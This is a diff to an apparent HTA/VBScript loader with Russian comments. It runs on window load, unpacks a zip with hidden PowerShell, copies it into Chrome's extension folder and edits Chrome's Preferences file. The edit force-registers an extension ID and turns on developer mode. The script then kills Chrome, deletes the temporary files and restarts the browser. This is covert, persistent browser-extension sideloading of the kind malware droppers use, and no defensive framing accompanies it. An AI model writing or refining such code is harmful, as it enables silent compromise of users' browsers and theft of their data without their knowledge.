@@ -26,7 +26,23 @@ Sub Window_onLoad
     
     ' Финальная проверка и установка расширения
     If fso.FileExists(tempFolder & "\test.zip") Then
-        ' Создаем папку и распаковываем
+        ' Получаем пути к папкам Chrome
+        userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
+        extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"  ' Замените на ID вашего расширения
+        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0.0"
+        
+        ' Создаем необходимые директории
+        If Not fso.FolderExists(userDataPath & "\Default\Extensions") Then
+            fso.CreateFolder(userDataPath & "\Default\Extensions")
+        End If
+        If Not fso.FolderExists(userDataPath & "\Default\Extensions\" & extensionId) Then
+            fso.CreateFolder(userDataPath & "\Default\Extensions\" & extensionId)
+        End If
+        If Not fso.FolderExists(chromeExtPath) Then
+            fso.CreateFolder(chromeExtPath)
+        End If
+        
+        ' Распаковываем во временную папку
         If Not fso.FolderExists(tempFolder & "\test") Then
             fso.CreateFolder(tempFolder & "\test")
         End If
@@ -34,20 +50,34 @@ Sub Window_onLoad
         unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
         shell.Run unzipCmd, 0, True
         
-        ' Удаляем zip после распаковки
+        ' Копируем файлы в папку расширений Chrome
+        xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
+        shell.Run xcopyCmd, 0, True
+        
+        ' Включаем режим разработчика и добавляем расширение в preferences
+        Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 1, True)
+        prefsContent = prefsFile.ReadAll()
+        prefsFile.Close
+        
+        ' Модифицируем preferences для включения режима разработчика и расширения
+        newPrefs = Replace(prefsContent, """extensions"":{", """extensions"":{""settings"":{""" & extensionId & """:{""location"":5,""manifest"":{""version"":""1.0.0""},""path"":""" & extensionId & "/1.0.0"",""state"":1}},""development_mode"":true,")
+        
+        Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 2, True)
+        prefsFile.Write newPrefs
+        prefsFile.Close
+        
+        ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
+        fso.DeleteFolder(tempFolder & "\test")
         
         ' Закрываем Chrome если он запущен
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
         ' Ждем 2 секунды
         shell.Run "ping -n 3 127.0.0.1", 0, True
         
-        ' Запускаем Chrome с нашим расширением
+        ' Запускаем Chrome
         chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
-        extensionPath = """" & tempFolder & "\test"""
-        shell.Run chromePath & " --load-extension=" & extensionPath & " chrome://extensions --no-first-run", 1, False
-    Else
-        ' Лог ошибки можно записать в файл, если нужно
+        shell.Run chromePath, 1, False
     End If
     
     self.close
